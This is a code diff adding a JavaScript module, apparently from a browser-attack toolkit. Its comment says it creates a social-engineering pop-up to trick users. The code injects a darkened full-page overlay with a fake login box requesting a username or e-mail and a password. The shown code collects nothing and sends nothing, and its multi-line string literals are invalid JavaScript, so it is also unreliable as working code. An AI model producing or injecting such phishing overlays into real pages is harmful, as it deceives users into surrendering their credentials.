@@ -1,0 +1,74 @@
+/*
+//DESC
+<html>
+<font color='blue'>this</font> module creates a <font color='green'>Social enginnering</font>
+<br>
+<b>pop-up</b> to trick a user into doing something.
+</html>
+//!DESC
+*/
+
+
+
+
+
+
+
+
+
+
+var styles = document.createElement("style");
+styles.innerHTML = ".popupdiv {
+width: 100%;
+height: 100%;
+background-color: black;
+opacity: 0.5;
+position: absolute;
+top: 0px;
+left: 0px;
+}
+.logindiv {
+position: absolute;
+height: 150px;
+width: 300px;
+left: 40%;
+top: 40%;
+
+background-color: white;
+border: 10px solid blue;
+border-radius: 5px;
+opacity: 1;
+z-index: 10;
+
+text-align: center;
+}
+
+
+
+
+
+";
+document.head.appendChild(styles);
+
+var popup = document.createElement("div");
+popup.innerHTML = "<div class='popupdiv'><div class='logindiv'>
+
+
+//ENTER TEXT HERE
+Enter your login information:
+<br>
+Username/E-mail:
+<br>
+<input type='text' name='user' />
+<br>
+<br>
+Password:
+<br>
+<input type='password' name='pass' />
+//////////////////////////////
+
+
+
+</div></div>";
+
+document.body.appendChild(popup);
